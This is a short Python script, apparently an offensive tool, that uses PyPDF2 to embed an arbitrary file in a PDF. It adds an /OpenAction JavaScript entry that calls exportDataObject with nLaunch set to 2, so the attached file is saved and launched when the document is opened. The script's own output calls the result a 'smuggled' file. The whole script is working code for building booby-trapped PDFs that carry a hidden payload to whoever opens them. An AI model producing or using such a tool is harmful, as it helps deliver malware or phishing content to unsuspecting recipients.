import sys
from PyPDF2 import PdfFileReader, PdfFileWriter
from PyPDF2.generic import NameObject, createStringObject, DictionaryObject

def add_attachment_to_pdf(inputpdf, file, outputpdf):
    # Check if all parameters are provided
    if not inputpdf or not file or not outputpdf:
        raise ValueError("All parameters (inputpdf, file, outputpdf) are required.")

    # Read the input PDF
    reader = PdfFileReader(inputpdf)
    writer = PdfFileWriter()

    # Append pages from the input PDF to the writer
    writer.appendPagesFromReader(reader)

    # Embed the file as an attachment
    with open(file, "rb") as attachment:
        writer.addAttachment(file, attachment.read())

    # Set the OpenAction property
    open_action = writer._root_object.get("/OpenAction")
    if open_action is None:
        open_action_dict = DictionaryObject({})
        writer._root_object.update({
            NameObject("/OpenAction"): open_action_dict
        })
    else:
        open_action_dict = open_action.getObject()

    # JavaScript
    open_action_dict.update({
        NameObject("/S"): NameObject("/JavaScript"),
        NameObject("/JS"): createStringObject('this.exportDataObject({ cName: "%s", nLaunch: 2 });' % file),
    })

    # Write the modified PDF to the output file
    with open(outputpdf, "wb") as output:
        writer.write(output)

    print(f'Success! PDF Smuggled HTML file "{outputpdf}" has been created.')

if __name__ == "__main__":
    # Check if the correct number of command-line arguments is provided
    if len(sys.argv) != 4:
        print("Usage: pdf2savefile.py inputpdf_file attachment_file outputpdf_file")
    else:
        # Extract the command-line arguments
        inputpdf = sys.argv[1]
        file = sys.argv[2]
        outputpdf = sys.argv[3]

        # Call the function to add the attachment and /OpenAction to the PDF
        add_attachment_to_pdf(inputpdf, file, outputpdf)
